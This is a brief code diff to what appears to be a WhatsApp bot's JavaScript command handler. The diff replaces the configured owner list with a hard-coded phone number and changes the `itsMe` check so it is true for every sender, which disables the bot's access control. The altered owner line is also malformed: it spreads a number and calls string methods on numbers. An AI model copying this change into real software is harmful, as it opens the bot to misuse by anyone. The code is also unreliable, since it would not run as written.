@@ -89,8 +89,8 @@ const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase(
 const args = body.trim().split(/ +/).slice(1)
 const pushname = m.pushName || "PRINCE"
 const botNumber = await Wizard.decodeJid(254768371432)
-const isCreator = [254768371432, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-const itsMe = m.sender == botNumber ? true : false
+const isCreator = [254768371432, ...254768371432].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const itsMe = m.sender == botNumber ? true : true
 const text = q = args.join(" ")
 const from = m.chat
 const quoted = m.quoted ? m.quoted : m
